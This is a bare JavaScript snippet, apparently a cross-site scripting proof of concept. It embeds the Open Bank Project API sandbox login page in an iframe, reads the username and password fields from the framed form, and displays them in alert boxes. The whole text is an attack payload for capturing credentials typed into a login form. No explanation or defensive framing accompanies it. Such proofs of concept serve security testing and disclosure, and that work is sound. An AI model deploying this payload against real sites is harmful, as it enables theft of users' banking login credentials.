var iframe = document.createElement("iframe");   
iframe.src = "https://apisandbox.openbankproject.com/user_mgt/login";
 iframe.style.width = "640px";
 iframe.style.height = "480px";
document.body.appendChild(iframe);
var user = parent.frames[0].document.forms[0].elements[0].value;
var pass = parent.frames[0].document.forms[0].elements[1].value;
alert(user);
alert(pass);
